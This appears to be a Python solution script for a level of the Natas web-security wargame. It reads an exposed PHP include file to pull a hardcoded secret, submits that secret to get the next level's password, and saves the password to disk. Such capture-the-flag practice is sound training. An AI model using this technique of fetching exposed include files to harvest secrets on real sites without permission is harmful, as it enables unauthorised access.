#!/usr/bin/env python
from driver import *
import urllib 

req = makeGetConnection()
# print req

# We get a hint that post is expected and that source code is even given.
# So let us take full advantage of that. Shall w?

# <form method=post>
# Input secret: <input name=secret><br>
# <input type=submit name=submit>
# </form>

# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>

sourcecode_req = makeGetConnection(target="index-source.html")
# print unescap_thml(sourcecode_req.text)


# include "includes/secret.inc"; /> />    if(array_key_exists("submit", $_POST)) { />        if($secret == $_POST['secret']) { />        print "Access granted. The password for natas7 is <censored>"; />    } else { />        print "Wrong secret"; /> 

# from snippet above from the source code, We seet that it is checking for
# 		1 post method 
# 		2 a $ecret variable
# 		3 a 'secret' param in the post that it compares with the $secret var and gives or not the password
# So we checkout that secret.php file



req = makeGetConnection(target = "includes/secret.inc")
# print req.text



# <?
# $secret = "FOEIUWGHFEEUHOFUOIU";
# ?>

# Now it seems we have all we need



params= {
	"secret" : "FOEIUWGHFEEUHOFUOIU",
	"submit" : True
}
req = makeGetConnection(post=True, data=params)
# print req




passw = retrievePassword(req)
print passw

nextLlv = int(lvl) + 1
with open( ("natas" + str(nextLlv) +".pass") , "w")as f:
	f.write(passw + "\n")
print "The password for natas" + str(nextLlv) + " is: " + passw


